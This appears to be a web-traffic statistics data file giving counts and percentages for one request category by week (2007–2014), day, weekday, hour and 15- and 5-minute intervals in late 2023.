W	Rr	2293	0.154	2014	06	01
W	Rr	3180	0.213	2014	05	25
W	Rr	1468	0.098	2014	05	18
W	Rr	1808	0.121	2014	05	11
W	Rr	1998	0.134	2014	05	04
W	Rr	1876	0.126	2014	04	27
W	Rr	2330	0.156	2014	04	20
W	Rr	2565	0.172	2014	04	13
W	Rr	2652	0.178	2014	04	06
W	Rr	2574	0.173	2014	03	30
W	Rr	1186	0.080	2014	03	23
W	Rr	1305	0.087	2014	03	16
W	Rr	2273	0.152	2014	03	09
W	Rr	2231	0.150	2014	03	02
W	Rr	1925	0.129	2014	02	23
W	Rr	7060	0.473	2014	02	16
W	Rr	2854	0.191	2014	02	09
W	Rr	3190	0.214	2014	02	02
W	Rr	3743	0.251	2014	01	26
W	Rr	3643	0.244	2014	01	19
W	Rr	2961	0.199	2014	01	12
W	Rr	2319	0.155	2014	01	05
W	Rr	981	0.066	2013	12	29
W	Rr	1108	0.074	2013	12	22
W	Rr	1226	0.082	2013	12	15
W	Rr	1285	0.086	2013	12	08
W	Rr	1289	0.086	2013	12	01
W	Rr	1404	0.094	2013	11	24
W	Rr	1142	0.077	2013	11	17
W	Rr	1334	0.089	2013	11	10
W	Rr	1277	0.086	2013	11	03
W	Rr	1035	0.069	2013	10	27
W	Rr	1309	0.088	2013	10	20
W	Rr	1302	0.087	2013	10	13
W	Rr	1432	0.096	2013	10	06
W	Rr	1178	0.079	2013	09	29
W	Rr	947	0.063	2013	09	22
W	Rr	1254	0.084	2013	09	15
W	Rr	1099	0.074	2013	09	08
W	Rr	1053	0.071	2013	09	01
W	Rr	1010	0.068	2013	08	25
W	Rr	1102	0.074	2013	08	18
W	Rr	1063	0.071	2013	08	11
W	Rr	1105	0.074	2013	08	04
W	Rr	1377	0.092	2013	07	28
W	Rr	1498	0.100	2013	07	21
W	Rr	1295	0.087	2013	07	14
W	Rr	1237	0.083	2013	07	07
W	Rr	1003	0.067	2013	06	30
W	Rr	1275	0.085	2013	06	23
W	Rr	1072	0.072	2013	06	16
W	Rr	1249	0.084	2013	06	09
W	Rr	1521	0.102	2013	06	02
W	Rr	1256	0.084	2013	05	26
W	Rr	1091	0.073	2013	05	19
W	Rr	1359	0.091	2013	05	12
W	Rr	1130	0.076	2013	05	05
W	Rr	1215	0.081	2013	04	28
W	Rr	1368	0.092	2013	04	21
W	Rr	1318	0.088	2013	04	14
W	Rr	1408	0.094	2013	04	07
W	Rr	1277	0.086	2013	03	31
W	Rr	1452	0.097	2013	03	24
W	Rr	1418	0.095	2013	03	17
W	Rr	1217	0.082	2013	03	10
W	Rr	1490	0.100	2013	03	03
W	Rr	1353	0.091	2013	02	24
W	Rr	1268	0.085	2013	02	17
W	Rr	1274	0.085	2013	02	10
W	Rr	1153	0.077	2013	02	03
W	Rr	1266	0.085	2013	01	27
W	Rr	1271	0.085	2013	01	20
W	Rr	1449	0.097	2013	01	13
W	Rr	1253	0.084	2013	01	06
W	Rr	1309	0.088	2012	12	30
W	Rr	1156	0.078	2012	12	23
W	Rr	1336	0.090	2012	12	16
W	Rr	1575	0.106	2012	12	09
W	Rr	1087	0.073	2012	12	02
W	Rr	1376	0.092	2012	11	25
W	Rr	1136	0.076	2012	11	18
W	Rr	1341	0.090	2012	11	11
W	Rr	1418	0.095	2012	11	04
W	Rr	1103	0.074	2012	10	28
W	Rr	1200	0.080	2012	10	21
W	Rr	1382	0.093	2012	10	14
W	Rr	1127	0.076	2012	10	07
W	Rr	1187	0.080	2012	09	30
W	Rr	1172	0.079	2012	09	23
W	Rr	1034	0.069	2012	09	16
W	Rr	944	0.063	2012	09	09
W	Rr	958	0.064	2012	09	02
W	Rr	734	0.049	2012	08	26
W	Rr	881	0.059	2012	08	19
W	Rr	874	0.059	2012	08	12
W	Rr	973	0.065	2012	08	05
W	Rr	1010	0.068	2012	07	29
W	Rr	943	0.063	2012	07	22
W	Rr	1089	0.073	2012	07	15
W	Rr	888	0.060	2012	07	08
W	Rr	845	0.057	2012	07	01
W	Rr	1070	0.072	2012	06	24
W	Rr	1050	0.070	2012	06	17
W	Rr	1271	0.085	2012	06	10
W	Rr	957	0.064	2012	06	03
W	Rr	1249	0.084	2012	05	27
W	Rr	1055	0.071	2012	05	20
W	Rr	1392	0.093	2012	05	13
W	Rr	1140	0.076	2012	05	06
W	Rr	1807	0.121	2012	04	29
W	Rr	1225	0.082	2012	04	22
W	Rr	1264	0.085	2012	04	15
W	Rr	1075	0.072	2012	04	08
W	Rr	1261	0.085	2012	04	01
W	Rr	1345	0.090	2012	03	25
W	Rr	1254	0.084	2012	03	18
W	Rr	1478	0.099	2012	03	11
W	Rr	1503	0.101	2012	03	04
W	Rr	1532	0.103	2012	02	26
W	Rr	1464	0.098	2012	02	19
W	Rr	1154	0.077	2012	02	12
W	Rr	1240	0.083	2012	02	05
W	Rr	1088	0.073	2012	01	29
W	Rr	1125	0.075	2012	01	22
W	Rr	60	0.004	2012	01	15
W	Rr	1472	0.099	2012	01	08
W	Rr	1122	0.075	2012	01	01
W	Rr	888	0.060	2011	12	25
W	Rr	1360	0.091	2011	12	18
W	Rr	1486	0.100	2011	12	11
W	Rr	1330	0.089	2011	12	04
W	Rr	1094	0.073	2011	11	27
W	Rr	1062	0.071	2011	11	20
W	Rr	1123	0.075	2011	11	13
W	Rr	975	0.065	2011	11	06
W	Rr	1264	0.085	2011	10	30
W	Rr	1140	0.076	2011	10	23
W	Rr	1211	0.081	2011	10	16
W	Rr	1236	0.083	2011	10	09
W	Rr	1128	0.076	2011	10	02
W	Rr	1083	0.073	2011	09	25
W	Rr	1451	0.097	2011	09	18
W	Rr	1278	0.086	2011	09	11
W	Rr	1219	0.082	2011	09	04
W	Rr	1316	0.088	2011	08	28
W	Rr	1119	0.075	2011	08	21
W	Rr	1484	0.099	2011	08	14
W	Rr	1671	0.112	2011	08	07
W	Rr	1319	0.088	2011	07	31
W	Rr	1197	0.080	2011	07	24
W	Rr	1504	0.101	2011	07	17
W	Rr	1367	0.092	2011	07	10
W	Rr	1205	0.081	2011	07	03
W	Rr	1333	0.089	2011	06	26
W	Rr	1059	0.071	2011	06	19
W	Rr	1353	0.091	2011	06	12
W	Rr	1275	0.085	2011	06	05
W	Rr	983	0.066	2011	05	29
W	Rr	1262	0.085	2011	05	22
W	Rr	1374	0.092	2011	05	15
W	Rr	1076	0.072	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.088	2011	03	13
W	Rr	1258	0.084	2011	03	06
W	Rr	1372	0.092	2011	02	27
W	Rr	1226	0.082	2011	02	20
W	Rr	1524	0.102	2011	02	13
W	Rr	1366	0.092	2011	02	06
W	Rr	958	0.064	2011	01	30
W	Rr	1273	0.085	2011	01	23
W	Rr	1560	0.105	2011	01	16
W	Rr	1472	0.099	2011	01	09
W	Rr	1310	0.088	2011	01	02
W	Rr	798	0.053	2010	12	26
W	Rr	935	0.063	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.061	2010	06	20
W	Rr	1104	0.074	2010	06	13
W	Rr	1096	0.073	2010	06	06
W	Rr	1171	0.079	2010	05	30
W	Rr	1115	0.075	2010	05	23
W	Rr	1170	0.078	2010	05	16
W	Rr	1334	0.089	2010	05	09
W	Rr	1109	0.074	2010	05	02
W	Rr	1067	0.072	2010	04	25
W	Rr	1212	0.081	2010	04	18
W	Rr	1054	0.071	2010	04	11
W	Rr	1325	0.089	2010	04	04
W	Rr	811	0.054	2010	03	28
W	Rr	1195	0.080	2010	03	21
W	Rr	1338	0.090	2010	03	14
W	Rr	1113	0.075	2010	03	07
W	Rr	1103	0.074	2010	02	28
W	Rr	1290	0.086	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.005	2009	12	27
W	Rr	945	0.063	2009	12	20
W	Rr	1140	0.076	2009	12	13
W	Rr	1323	0.089	2009	12	06
W	Rr	1518	0.102	2009	11	29
W	Rr	1352	0.091	2009	11	22
W	Rr	1346	0.090	2009	11	15
W	Rr	1416	0.095	2009	11	08
W	Rr	1734	0.116	2009	11	01
W	Rr	1035	0.069	2009	10	25
W	Rr	1297	0.087	2009	10	18
W	Rr	1267	0.085	2009	10	11
W	Rr	1440	0.097	2009	10	04
W	Rr	1521	0.102	2009	09	27
W	Rr	1121	0.075	2009	09	20
W	Rr	875	0.059	2009	09	13
W	Rr	1032	0.069	2009	09	06
W	Rr	1283	0.086	2009	08	30
W	Rr	1214	0.081	2009	08	23
W	Rr	1402	0.094	2009	08	16
W	Rr	1260	0.084	2009	08	09
W	Rr	1404	0.094	2009	08	02
W	Rr	1380	0.093	2009	07	26
W	Rr	1470	0.099	2009	07	19
W	Rr	1750	0.117	2009	07	12
W	Rr	1847	0.124	2009	07	05
W	Rr	1889	0.127	2009	06	28
W	Rr	1312	0.088	2009	06	21
W	Rr	1093	0.073	2009	06	14
W	Rr	1363	0.091	2009	06	07
W	Rr	1251	0.084	2009	05	31
W	Rr	1352	0.091	2009	05	24
W	Rr	1133	0.076	2009	05	17
W	Rr	1887	0.127	2009	05	10
W	Rr	1369	0.092	2009	05	03
W	Rr	1089	0.073	2009	04	26
W	Rr	1160	0.078	2009	04	19
W	Rr	1189	0.080	2009	04	12
W	Rr	1529	0.103	2009	04	05
W	Rr	1155	0.077	2009	03	29
W	Rr	1230	0.082	2009	03	22
W	Rr	1029	0.069	2009	03	15
W	Rr	1234	0.083	2009	03	08
W	Rr	1486	0.100	2009	03	01
W	Rr	1470	0.099	2009	02	22
W	Rr	1198	0.080	2009	02	15
W	Rr	1802	0.121	2009	02	08
W	Rr	1653	0.111	2009	02	01
W	Rr	1346	0.090	2009	01	25
W	Rr	1431	0.096	2009	01	18
W	Rr	1678	0.112	2009	01	11
W	Rr	1591	0.107	2009	01	04
W	Rr	886	0.059	2008	12	28
W	Rr	1148	0.077	2008	12	21
W	Rr	1428	0.096	2008	12	14
W	Rr	1508	0.101	2008	12	07
W	Rr	1194	0.080	2008	11	30
W	Rr	1070	0.072	2008	11	23
W	Rr	1396	0.094	2008	11	16
W	Rr	1255	0.084	2008	11	09
W	Rr	1314	0.088	2008	11	02
W	Rr	1397	0.094	2008	10	26
W	Rr	1638	0.110	2008	10	19
W	Rr	1298	0.087	2008	10	12
W	Rr	430	0.029	2008	10	05
W	Rr	723	0.048	2008	09	28
W	Rr	1308	0.088	2008	09	21
W	Rr	1242	0.083	2008	09	14
W	Rr	1409	0.094	2008	09	07
W	Rr	1142	0.077	2008	08	31
W	Rr	1022	0.069	2008	08	24
W	Rr	1062	0.071	2008	08	17
W	Rr	1188	0.080	2008	08	10
W	Rr	1232	0.083	2008	08	03
W	Rr	1050	0.070	2008	07	27
W	Rr	1272	0.085	2008	07	20
W	Rr	1305	0.087	2008	07	13
W	Rr	1093	0.073	2008	07	06
W	Rr	1182	0.079	2008	06	29
W	Rr	1937	0.130	2008	06	22
W	Rr	1493	0.100	2008	06	15
W	Rr	1083	0.073	2008	06	08
W	Rr	1283	0.086	2008	06	01
W	Rr	1432	0.096	2008	05	25
W	Rr	1726	0.116	2008	05	18
W	Rr	1580	0.106	2008	05	11
W	Rr	2661	0.178	2008	05	04
W	Rr	3648	0.245	2008	04	27
W	Rr	1400	0.094	2008	04	20
W	Rr	1365	0.092	2008	04	13
W	Rr	1213	0.081	2008	04	06
W	Rr	1670	0.112	2008	03	30
W	Rr	1211	0.081	2008	03	23
W	Rr	1144	0.077	2008	03	16
W	Rr	1301	0.087	2008	03	09
W	Rr	1292	0.087	2008	03	02
W	Rr	1427	0.096	2008	02	24
W	Rr	2207	0.148	2008	02	17
W	Rr	1124	0.075	2008	02	10
W	Rr	1561	0.105	2008	02	03
W	Rr	1533	0.103	2008	01	27
W	Rr	1389	0.093	2008	01	20
W	Rr	1133	0.076	2008	01	13
W	Rr	1404	0.094	2008	01	06
W	Rr	976	0.065	2007	12	30
W	Rr	801	0.054	2007	12	23
W	Rr	675	0.045	2007	12	16
W	*BT	R	17181	2023	05	07
D	Rr	74	0.005	2023	11	05
D	Rr	312	0.021	2023	11	04
D	Rr	502	0.034	2023	11	03
D	Rr	1711	0.115	2023	11	02
D	Rr	991	0.066	2023	11	01
D	Rr	3415	0.229	2023	10	31
D	Rr	2706	0.181	2023	10	30
D	Rr	1530	0.103	2023	10	29
D	Rr	2154	0.144	2023	10	28
D	Rr	1506	0.101	2023	10	27
D	Rr	2322	0.156	2023	10	26
D	Rr	2412	0.162	2023	10	25
D	Rr	1416	0.095	2023	10	24
D	Rr	2934	0.197	2023	10	23
D	Rr	1236	0.083	2023	10	22
D	Rr	1950	0.131	2023	10	21
D	Rr	1596	0.107	2023	10	20
D	Rr	2478	0.166	2023	10	19
D	Rr	2616	0.175	2023	10	18
D	Rr	1662	0.111	2023	10	17
D	Rr	3420	0.229	2023	10	16
D	Rr	1728	0.116	2023	10	15
D	Rr	2646	0.177	2023	10	14
D	Rr	2742	0.184	2023	10	13
D	Rr	1494	0.100	2023	10	12
D	Rr	1676	0.112	2023	10	11
D	Rr	1910	0.128	2023	10	10
D	Rr	2170	0.145	2023	10	09
D	Rr	2075	0.139	2023	10	08
D	Rr	1455	0.098	2023	10	07
D	Rr	1500	0.101	2023	10	06
D	Rr	2042	0.137	2023	10	05
D	Rr	3672	0.246	2023	10	04
D	Rr	2748	0.184	2023	10	03
D	Rr	1320	0.088	2023	10	02
D	Rr	1548	0.104	2023	10	01
D	Rr	1686	0.113	2023	09	30
D	Rr	3432	0.230	2023	09	29
D	Rr	2448	0.164	2023	09	28
D	Rr	1500	0.101	2023	09	27
D	Rr	2460	0.165	2023	09	26
D	Rr	1368	0.092	2023	09	25
D	*BT	R	5220	2023	05	08
d	Rr	175107	11.739	Sun
d	Rr	241632	16.199	Mon
d	Rr	241591	16.197	Tue
d	Rr	246984	16.558	Wed
d	Rr	238916	16.017	Thu
d	Rr	227779	15.271	Fri
d	Rr	119598	8.018	Sat
H	Rr	34	0.002	2023	11	05	04
H	Rr	22	0.001	2023	11	05	03
H	Rr	4	0.000	2023	11	05	02
H	Rr	5	0.000	2023	11	05	01
H	Rr	9	0.001	2023	11	05	00
H	Rr	11	0.001	2023	11	04	23
H	Rr	8	0.001	2023	11	04	22
H	Rr	20	0.001	2023	11	04	21
H	Rr	37	0.002	2023	11	04	20
H	Rr	15	0.001	2023	11	04	19
H	Rr	10	0.001	2023	11	04	18
H	Rr	17	0.001	2023	11	04	17
H	Rr	12	0.001	2023	11	04	16
H	Rr	11	0.001	2023	11	04	15
H	Rr	26	0.002	2023	11	04	14
H	Rr	3	0.000	2023	11	04	13
H	Rr	6	0.000	2023	11	04	12
H	Rr	28	0.002	2023	11	04	11
H	Rr	13	0.001	2023	11	04	10
H	Rr	13	0.001	2023	11	04	09
H	Rr	8	0.001	2023	11	04	08
H	Rr	4	0.000	2023	11	04	07
H	Rr	11	0.001	2023	11	04	06
H	Rr	1	0.000	2023	11	04	05
H	Rr	22	0.001	2023	11	04	04
H	Rr	12	0.001	2023	11	04	03
H	Rr	18	0.001	2023	11	04	02
H	Rr	6	0.000	2023	11	04	01
H	Rr	0	0.000	2023	11	04	00
H	Rr	44	0.003	2023	11	03	23
H	Rr	8	0.001	2023	11	03	22
H	Rr	14	0.001	2023	11	03	21
H	Rr	2	0.000	2023	11	03	20
H	Rr	30	0.002	2023	11	03	19
H	Rr	18	0.001	2023	11	03	18
H	Rr	4	0.000	2023	11	03	17
H	Rr	10	0.001	2023	11	03	16
H	Rr	16	0.001	2023	11	03	15
H	Rr	64	0.004	2023	11	03	14
H	Rr	22	0.001	2023	11	03	13
H	Rr	10	0.001	2023	11	03	12
H	Rr	2	0.000	2023	11	03	11
H	Rr	8	0.001	2023	11	03	10
H	Rr	2	0.000	2023	11	03	09
H	Rr	70	0.005	2023	11	03	08
H	Rr	16	0.001	2023	11	03	07
H	Rr	2	0.000	2023	11	03	06
H	Rr	58	0.004	2023	11	03	05
H	Rr	9	0.001	2023	11	03	04
H	Rr	33	0.002	2023	11	03	03
H	Rr	33	0.002	2023	11	03	02
H	Rr	9	0.001	2023	11	03	01
H	Rr	18	0.001	2023	11	03	00
H	Rr	39	0.003	2023	11	02	23
H	Rr	51	0.003	2023	11	02	22
H	Rr	21	0.001	2023	11	02	21
H	Rr	15	0.001	2023	11	02	20
H	Rr	24	0.002	2023	11	02	19
H	Rr	15	0.001	2023	11	02	18
H	Rr	186	0.012	2023	11	02	17
H	Rr	180	0.012	2023	11	02	16
H	Rr	138	0.009	2023	11	02	15
H	Rr	234	0.016	2023	11	02	14
H	Rr	18	0.001	2023	11	02	13
H	Rr	54	0.004	2023	11	02	12
H	Rr	6	0.000	2023	11	02	11
H	Rr	15	0.001	2023	11	02	10
H	Rr	21	0.001	2023	11	02	09
H	Rr	24	0.002	2023	11	02	08
H	Rr	24	0.002	2023	11	02	07
H	Rr	255	0.017	2023	11	02	06
H	Rr	87	0.006	2023	11	02	05
H	*BT	R	1225	2023	05	08	18
h	Rr	56919	3.816	00
h	Rr	56500	3.788	01
h	Rr	56910	3.815	02
h	Rr	59891	4.015	03
h	Rr	56936	3.817	04
h	Rr	53423	3.582	05
h	Rr	50853	3.409	06
h	Rr	51561	3.457	07
h	Rr	48516	3.253	08
h	Rr	45562	3.055	09
h	Rr	49160	3.296	10
h	Rr	53264	3.571	11
h	Rr	53509	3.587	12
h	Rr	57972	3.887	13
h	Rr	70365	4.717	14
h	Rr	74882	5.020	15
h	Rr	79885	5.356	16
h	Rr	83953	5.628	17
h	Rr	79510	5.330	18
h	Rr	79349	5.320	19
h	Rr	75169	5.039	20
h	Rr	71177	4.772	21
h	Rr	64297	4.311	22
h	Rr	62044	4.160	23
4	Rr	1	0.000	2023	11	05	04	45
4	Rr	0	0.000	2023	11	05	04	30
4	Rr	2	0.000	2023	11	05	04	15
4	Rr	31	0.002	2023	11	05	04	00
4	Rr	2	0.000	2023	11	05	03	45
4	Rr	13	0.001	2023	11	05	03	30
4	Rr	3	0.000	2023	11	05	03	15
4	Rr	4	0.000	2023	11	05	03	00
4	Rr	3	0.000	2023	11	05	02	45
4	Rr	0	0.000	2023	11	05	02	30
4	Rr	0	0.000	2023	11	05	02	15
4	Rr	1	0.000	2023	11	05	02	00
4	Rr	1	0.000	2023	11	05	01	45
4	Rr	1	0.000	2023	11	05	01	30
4	Rr	2	0.000	2023	11	05	01	15
4	Rr	1	0.000	2023	11	05	01	00
4	Rr	2	0.000	2023	11	05	00	45
4	Rr	2	0.000	2023	11	05	00	30
4	Rr	2	0.000	2023	11	05	00	15
4	Rr	3	0.000	2023	11	05	00	00
4	Rr	0	0.000	2023	11	04	23	45
4	Rr	3	0.000	2023	11	04	23	30
4	Rr	4	0.000	2023	11	04	23	15
4	Rr	4	0.000	2023	11	04	23	00
4	Rr	2	0.000	2023	11	04	22	45
4	Rr	1	0.000	2023	11	04	22	30
4	Rr	5	0.000	2023	11	04	22	15
4	Rr	0	0.000	2023	11	04	22	00
4	Rr	9	0.001	2023	11	04	21	45
4	Rr	6	0.000	2023	11	04	21	30
4	Rr	3	0.000	2023	11	04	21	15
4	Rr	2	0.000	2023	11	04	21	00
4	Rr	31	0.002	2023	11	04	20	45
4	Rr	0	0.000	2023	11	04	20	30
4	Rr	4	0.000	2023	11	04	20	15
4	Rr	2	0.000	2023	11	04	20	00
4	Rr	5	0.000	2023	11	04	19	45
4	Rr	3	0.000	2023	11	04	19	30
4	Rr	4	0.000	2023	11	04	19	15
4	Rr	3	0.000	2023	11	04	19	00
4	Rr	3	0.000	2023	11	04	18	45
4	Rr	2	0.000	2023	11	04	18	30
4	Rr	2	0.000	2023	11	04	18	15
4	Rr	3	0.000	2023	11	04	18	00
4	Rr	3	0.000	2023	11	04	17	45
4	Rr	3	0.000	2023	11	04	17	30
4	Rr	9	0.001	2023	11	04	17	15
4	Rr	2	0.000	2023	11	04	17	00
4	Rr	3	0.000	2023	11	04	16	45
4	Rr	2	0.000	2023	11	04	16	30
4	Rr	5	0.000	2023	11	04	16	15
4	Rr	2	0.000	2023	11	04	16	00
4	Rr	3	0.000	2023	11	04	15	45
4	Rr	2	0.000	2023	11	04	15	30
4	Rr	3	0.000	2023	11	04	15	15
4	Rr	3	0.000	2023	11	04	15	00
4	Rr	3	0.000	2023	11	04	14	45
4	Rr	12	0.001	2023	11	04	14	30
4	Rr	10	0.001	2023	11	04	14	15
4	Rr	1	0.000	2023	11	04	14	00
4	Rr	0	0.000	2023	11	04	13	45
4	Rr	1	0.000	2023	11	04	13	30
4	Rr	1	0.000	2023	11	04	13	15
4	Rr	1	0.000	2023	11	04	13	00
4	Rr	5	0.000	2023	11	04	12	45
4	Rr	0	0.000	2023	11	04	12	30
4	Rr	1	0.000	2023	11	04	12	15
4	Rr	0	0.000	2023	11	04	12	00
4	Rr	21	0.001	2023	11	04	11	45
4	Rr	1	0.000	2023	11	04	11	30
4	Rr	5	0.000	2023	11	04	11	15
4	Rr	1	0.000	2023	11	04	11	00
4	Rr	4	0.000	2023	11	04	10	45
4	Rr	7	0.000	2023	11	04	10	30
4	Rr	0	0.000	2023	11	04	10	15
4	Rr	2	0.000	2023	11	04	10	00
4	Rr	1	0.000	2023	11	04	09	45
4	Rr	3	0.000	2023	11	04	09	30
4	Rr	2	0.000	2023	11	04	09	15
4	Rr	7	0.000	2023	11	04	09	00
4	Rr	2	0.000	2023	11	04	08	45
4	Rr	4	0.000	2023	11	04	08	30
4	Rr	0	0.000	2023	11	04	08	15
4	Rr	2	0.000	2023	11	04	08	00
4	Rr	0	0.000	2023	11	04	07	45
4	Rr	0	0.000	2023	11	04	07	30
4	Rr	4	0.000	2023	11	04	07	15
4	Rr	0	0.000	2023	11	04	07	00
4	Rr	4	0.000	2023	11	04	06	45
4	Rr	1	0.000	2023	11	04	06	30
4	Rr	6	0.000	2023	11	04	06	15
4	Rr	0	0.000	2023	11	04	06	00
4	Rr	0	0.000	2023	11	04	05	45
4	Rr	0	0.000	2023	11	04	05	30
4	Rr	1	0.000	2023	11	04	05	15
4	Rr	0	0.000	2023	11	04	05	00
4	*BT	R	975	2023	05	08	18	00
6	Rr	13689	0.918	00	00
6	Rr	13900	0.932	00	15
6	Rr	14563	0.976	00	30
6	Rr	14767	0.990	00	45
6	Rr	13126	0.880	01	00
6	Rr	14712	0.986	01	15
6	Rr	13874	0.930	01	30
6	Rr	14788	0.991	01	45
6	Rr	13056	0.875	02	00
6	Rr	14474	0.970	02	15
6	Rr	14993	1.005	02	30
6	Rr	14387	0.965	02	45
6	Rr	14549	0.975	03	00
6	Rr	13913	0.933	03	15
6	Rr	14195	0.952	03	30
6	Rr	17234	1.155	03	45
6	Rr	13832	0.927	04	00
6	Rr	13759	0.922	04	15
6	Rr	14269	0.957	04	30
6	Rr	15076	1.011	04	45
6	Rr	12799	0.858	05	00
6	Rr	14320	0.960	05	15
6	Rr	13224	0.887	05	30
6	Rr	13080	0.877	05	45
6	Rr	13542	0.908	06	00
6	Rr	12473	0.836	06	15
6	Rr	13081	0.877	06	30
6	Rr	11757	0.788	06	45
6	Rr	13450	0.902	07	00
6	Rr	13208	0.885	07	15
6	Rr	12850	0.861	07	30
6	Rr	12053	0.808	07	45
6	Rr	11832	0.793	08	00
6	Rr	12544	0.841	08	15
6	Rr	12659	0.849	08	30
6	Rr	11481	0.770	08	45
6	Rr	10843	0.727	09	00
6	Rr	11158	0.748	09	15
6	Rr	12411	0.832	09	30
6	Rr	11150	0.748	09	45
6	Rr	11484	0.770	10	00
6	Rr	12662	0.849	10	15
6	Rr	12796	0.858	10	30
6	Rr	12218	0.819	10	45
6	Rr	14445	0.968	11	00
6	Rr	13355	0.895	11	15
6	Rr	13648	0.915	11	30
6	Rr	11816	0.792	11	45
6	Rr	14170	0.950	12	00
6	Rr	12805	0.858	12	15
6	Rr	12389	0.831	12	30
6	Rr	14145	0.948	12	45
6	Rr	13041	0.874	13	00
6	Rr	15435	1.035	13	15
6	Rr	15140	1.015	13	30
6	Rr	14356	0.962	13	45
6	Rr	16909	1.134	14	00
6	Rr	18701	1.254	14	15
6	Rr	17291	1.159	14	30
6	Rr	17464	1.171	14	45
6	Rr	17895	1.200	15	00
6	Rr	17981	1.205	15	15
6	Rr	19695	1.320	15	30
6	Rr	19311	1.295	15	45
6	Rr	19998	1.341	16	00
6	Rr	19900	1.334	16	15
6	Rr	19051	1.277	16	30
6	Rr	20936	1.404	16	45
6	Rr	21484	1.440	17	00
6	Rr	21303	1.428	17	15
6	Rr	21438	1.437	17	30
6	Rr	19728	1.323	17	45
6	Rr	20998	1.408	18	00
6	Rr	18691	1.253	18	15
6	Rr	20274	1.359	18	30
6	Rr	19547	1.310	18	45
6	Rr	20798	1.394	19	00
6	Rr	19219	1.288	19	15
6	Rr	19436	1.303	19	30
6	Rr	19896	1.334	19	45
6	Rr	18899	1.267	20	00
6	Rr	19541	1.310	20	15
6	Rr	16901	1.133	20	30
6	Rr	19828	1.329	20	45
6	Rr	17858	1.197	21	00
6	Rr	18212	1.221	21	15
6	Rr	16426	1.101	21	30
6	Rr	18681	1.252	21	45
6	Rr	15639	1.048	22	00
6	Rr	15904	1.066	22	15
6	Rr	16139	1.082	22	30
6	Rr	16615	1.114	22	45
6	Rr	16292	1.092	23	00
6	Rr	16867	1.131	23	15
6	Rr	14155	0.949	23	30
6	Rr	14730	0.988	23	45
5	Rr	1	0.000	2023	11	05	04	45
5	Rr	0	0.000	2023	11	05	04	40
5	Rr	0	0.000	2023	11	05	04	35
5	Rr	0	0.000	2023	11	05	04	30
5	Rr	1	0.000	2023	11	05	04	25
5	Rr	1	0.000	2023	11	05	04	20
5	Rr	0	0.000	2023	11	05	04	15
5	Rr	1	0.000	2023	11	05	04	10
5	Rr	30	0.002	2023	11	05	04	05
5	Rr	0	0.000	2023	11	05	04	00
5	Rr	0	0.000	2023	11	05	03	55
5	Rr	1	0.000	2023	11	05	03	50
5	Rr	1	0.000	2023	11	05	03	45
5	Rr	9	0.001	2023	11	05	03	40
5	Rr	3	0.000	2023	11	05	03	35
5	Rr	1	0.000	2023	11	05	03	30
5	Rr	0	0.000	2023	11	05	03	25
5	Rr	1	0.000	2023	11	05	03	20
5	Rr	2	0.000	2023	11	05	03	15
5	Rr	1	0.000	2023	11	05	03	10
5	Rr	1	0.000	2023	11	05	03	05
5	Rr	2	0.000	2023	11	05	03	00
5	Rr	0	0.000	2023	11	05	02	55
5	Rr	2	0.000	2023	11	05	02	50
5	Rr	1	0.000	2023	11	05	02	45
5	Rr	0	0.000	2023	11	05	02	40
5	Rr	0	0.000	2023	11	05	02	35
5	Rr	0	0.000	2023	11	05	02	30
5	Rr	0	0.000	2023	11	05	02	25
5	Rr	0	0.000	2023	11	05	02	20
5	Rr	0	0.000	2023	11	05	02	15
5	Rr	1	0.000	2023	11	05	02	10
5	Rr	0	0.000	2023	11	05	02	05
5	Rr	0	0.000	2023	11	05	02	00
5	Rr	0	0.000	2023	11	05	01	55
5	Rr	0	0.000	2023	11	05	01	50
5	Rr	1	0.000	2023	11	05	01	45
5	Rr	1	0.000	2023	11	05	01	40
5	Rr	0	0.000	2023	11	05	01	35
5	Rr	0	0.000	2023	11	05	01	30
5	Rr	1	0.000	2023	11	05	01	25
5	Rr	0	0.000	2023	11	05	01	20
5	Rr	1	0.000	2023	11	05	01	15
5	Rr	0	0.000	2023	11	05	01	10
5	Rr	1	0.000	2023	11	05	01	05
5	Rr	0	0.000	2023	11	05	01	00
5	Rr	1	0.000	2023	11	05	00	55
5	Rr	0	0.000	2023	11	05	00	50
5	Rr	1	0.000	2023	11	05	00	45
5	Rr	1	0.000	2023	11	05	00	40
5	Rr	0	0.000	2023	11	05	00	35
5	Rr	1	0.000	2023	11	05	00	30
5	Rr	1	0.000	2023	11	05	00	25
5	Rr	0	0.000	2023	11	05	00	20
5	Rr	1	0.000	2023	11	05	00	15
5	Rr	1	0.000	2023	11	05	00	10
5	Rr	1	0.000	2023	11	05	00	05
5	Rr	1	0.000	2023	11	05	00	00
5	Rr	0	0.000	2023	11	04	23	55
5	Rr	0	0.000	2023	11	04	23	50
5	Rr	0	0.000	2023	11	04	23	45
5	Rr	2	0.000	2023	11	04	23	40
5	Rr	1	0.000	2023	11	04	23	35
5	Rr	0	0.000	2023	11	04	23	30
5	Rr	0	0.000	2023	11	04	23	25
5	Rr	4	0.000	2023	11	04	23	20
5	Rr	0	0.000	2023	11	04	23	15
5	Rr	2	0.000	2023	11	04	23	10
